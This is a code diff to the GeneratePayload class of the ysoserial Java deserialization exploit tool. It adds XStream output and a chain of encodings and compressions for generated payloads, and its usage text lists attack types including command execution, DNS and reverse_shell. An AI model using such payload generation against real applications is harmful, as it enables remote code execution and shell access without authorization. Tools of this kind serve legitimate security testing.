@@ -35,8 +35,12 @@ public class GeneratePayload {
 		}
 		
 		String[] payloadTransformations = null;
+		boolean xstream = false;
 		if (args.length >= 4) {
 			payloadTransformations = args[3].split(",");
+			if(args[3].contains("xstream")) {
+				xstream = true;
+			}
 		}
 		
 		final String payloadType = args[0];
@@ -55,20 +59,27 @@ public class GeneratePayload {
 			final Object object = payload.getObject(command, attackType);
 			PrintStream out = System.out;
 			
-			byte[] serializedObjectBytes = Serializer.serialize(object);
+			if(!xstream) {
 			
-			byte[] transformedObjectBytes = serializedObjectBytes;
-			if(payloadTransformations != null) {
+				byte[] serializedObjectBytes = Serializer.serialize(object);
 			
-				for(String s : payloadTransformations) {
-				
-					transformedObjectBytes = Transformation.valueOf(s.toUpperCase().trim()).transform(transformedObjectBytes);
-										
+				byte[] transformedObjectBytes = serializedObjectBytes;
+				if(payloadTransformations != null) {
+					
+					for(String s : payloadTransformations) {
+						transformedObjectBytes = Transformation.valueOf(s.toUpperCase().trim()).transform(transformedObjectBytes);
+					}
+			
 				}
+				
+				out.write(transformedObjectBytes);
+				
+			} else {
+				
+				Serializer.serializeXstream(object, out);
+				
+			}									
 			
-			}
-									
-			out.write(transformedObjectBytes);
 			out.flush();
 			out.close();
 			
@@ -83,7 +94,9 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [attack_type]");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [attack_type] [payload_transformations]");
+		System.err.println("[attack_type] is optional and default to exec_global (ysoserial standard)");
+		System.err.println("[payload_transformations] is optional and is a comma-separeted list of encoding and compressions that will be applied in order on the payload");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
@@ -107,12 +120,25 @@ public class GeneratePayload {
             System.err.println("     " + line);
         }
         
-        System.err.println("\tAvailable payload types:");
-		System.err.println("\t\texec_global");
-		System.err.println("\t\texec_win");
-		System.err.println("\t\texec_unix");
-		System.err.println("\t\tsleep");
-		System.err.println("\t\tdns");
+        System.err.println("");
+        System.err.println("  Available payload types:");
+		System.err.println("     exec_global");
+		System.err.println("     exec_win");
+		System.err.println("     exec_unix");
+		System.err.println("     sleep");
+		System.err.println("     dns");
+		System.err.println("     reverse_shell");
+		System.err.println("");
+		System.err.println("");
+		System.err.println("  Available transformations:");
+		System.err.println("     xstream (if xstream is chosen other transformations will be discarded)");
+		System.err.println("     base64");
+		System.err.println("     base64_url_safe");
+		System.err.println("     url_encoding");
+		System.err.println("     ascii_hex");
+		System.err.println("     gzip");
+		System.err.println("     zlib");
+		
     }
 	
     private enum Transformation {
